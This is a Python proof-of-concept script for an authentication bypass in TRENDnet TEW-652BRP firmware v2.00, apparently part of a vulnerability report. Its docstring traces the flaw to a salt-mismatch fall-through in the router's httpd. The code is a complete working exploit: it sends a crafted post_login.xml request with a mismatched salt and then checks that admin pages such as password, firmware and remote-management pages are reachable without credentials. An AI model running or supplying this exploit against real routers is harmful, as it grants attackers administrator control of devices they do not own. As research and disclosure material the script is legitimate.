#!/usr/bin/env python3
"""
PoC — TRENDnet TEW-652BRP (fw v2.00) authentication bypass via login-salt mismatch.
Report finding: Tr1 (CRITICAL).

Root cause (do_agentLogin_action @ 0x404ad0 in /sbin/httpd):
    When the client-supplied 8-hex salt does NOT match the server's login_salt,
    execution falls through to LABEL_7 — the success handler — which calls
    update_logout_list() to whitelist the attacker's source IP, then returns
    <login></login>. The password MD5 is never checked.

Auth enforcement (main @ 0x41d29c, mime_handlers @ 0x485a10):
    All .asp / .cgi / .html / .htm / .css / .js endpoints carry auth handler
    sub_425120 (0x425120).  Only post_login.xml, device.xml, .gif, .jpg have
    NULL auth handlers.  On real hardware, unauthenticated .asp/.cgi requests
    are redirected to login.asp (JS redirect).  The bypass adds the attacker's
    IP to update_logout_list, and subsequent requests are served directly.

Threat model: network-only, zero credentials. Single GET → administrator web access.

Usage:
    python3 poc_tew652brp_tr1_auth_bypass.py --target http://172.17.0.3
    python3 poc_tew652brp_tr1_auth_bypass.py --target http://192.168.10.1 -e /wireless_basic.asp
"""
import argparse, sys
import requests


ENDPOINTS = [
    "/status.asp",
    "/wireless_basic.asp",
    "/wireless_auth.asp",
    "/lan.asp",
    "/wan.asp",
    "/password.asp",
    "/firmware.asp",
    "/filters.asp",
    "/ddns.asp",
    "/remote_management.asp",
]


def _is_js_redirect_to_login(text):
    """True if response is a JS redirect to login.asp (auth-blocked)."""
    t = (text or "").lower()
    return ("login.asp" in t and "document.location" in t) or \
           ("login.asp" in t and "redirect" in t and len(t) < 600)


def _resp_classify(r):
    """Classify a page response."""
    t = r.text or ""
    if _is_js_redirect_to_login(t):
        return "BLOCKED"
    if len(t) > 800:
        return "FULL_PAGE"
    if len(t) == 0:
        return "EMPTY"
    return "OTHER"


def _probe(sess, base, endpoint, timeout):
    r = sess.get(base + endpoint, timeout=timeout, allow_redirects=True)
    return r, _resp_classify(r)


def main():
    ap = argparse.ArgumentParser(
        description="TEW-652BRP Tr1 auth bypass PoC")
    ap.add_argument("--target", default="http://172.17.0.4")
    ap.add_argument("--endpoints", "-e", nargs="*",
                    help="endpoints to probe (default: 10 common ASP pages)")
    ap.add_argument("--salt", default="00000000",
                    help="non-matching 8-hex salt to send in post_login.xml")
    ap.add_argument("--timeout", type=int, default=5)
    a = ap.parse_args()
    base = a.target.rstrip("/")
    eps = [ep if ep.startswith("/") else "/" + ep
           for ep in (a.endpoints if a.endpoints else ENDPOINTS)]

    sess = requests.Session()
    print(f"[*] Target: {base}")
    print(f"[*] Protected endpoints: {len(eps)}")

    print()
    print("== Stage 1: pre-auth protected endpoint probe ==")
    pre = []
    for ep in eps:
        r, cls = _probe(sess, base, ep, a.timeout)
        pre.append((ep, r, cls))
        print(f"  {ep:35s} HTTP {r.status_code:<3d} {cls:10s} {len(r.text)}B")

    print()
    print("== Stage 2: send salt-mismatch login bypass ==")
    md5 = "a" * 32
    url = f"{base}/post_login.xml?hash={a.salt}{md5}"
    r = sess.get(url, timeout=a.timeout)
    bypass_ok = "<login>" in r.text and "error" not in r.text and "timeout" not in r.text
    print(f"  GET /post_login.xml?hash={a.salt}{md5[:8]}... -> HTTP {r.status_code}")
    print(f"  body: {r.text.strip()[:240]}")
    if not bypass_ok:
        print("[-] Bypass rejected: target may be patched or not TEW-652BRP v2.00.")
        sys.exit(1)

    print()
    print("== Stage 3: post-bypass protected endpoint probe ==")
    results = []
    for ep, r_pre, cls_pre in pre:
        r_post, cls_post = _probe(sess, base, ep, a.timeout)

        changed = "DIFFER" if (r_pre.status_code != r_post.status_code or
                               len(r_pre.text) != len(r_post.text) or
                               cls_pre != cls_post) else "SAME"

        results.append((ep, cls_pre, cls_post, changed, r_pre, r_post))

        print(f"  {ep:35s} before={cls_pre:10s} after={cls_post:10s} {changed}")
        if changed == "DIFFER":
            print(f"    PRE  ({r_pre.status_code}, {len(r_pre.text)}B): {r_pre.text.strip()[:200]}")
            print(f"    POST ({r_post.status_code}, {len(r_post.text)}B): {r_post.text.strip()[:200]}")

    print()
    accessible_after = [r for r in results if r[2] in ("FULL_PAGE", "OTHER")]
    changed_pairs = [r for r in results if r[3] == "DIFFER"]

    if changed_pairs and accessible_after:
        print("[+] VERIFIED: invalid salt reached the login-success path and protected endpoints are accessible.")
        for ep, pre, post, _, r_pre, r_post in changed_pairs:
            print(f"    {ep}: {pre} -> {post}")
        sys.exit(0)

    print("[-] Bypass response was accepted, but protected endpoint access was not verified.")
    sys.exit(1)


if __name__ == "__main__":
    main()
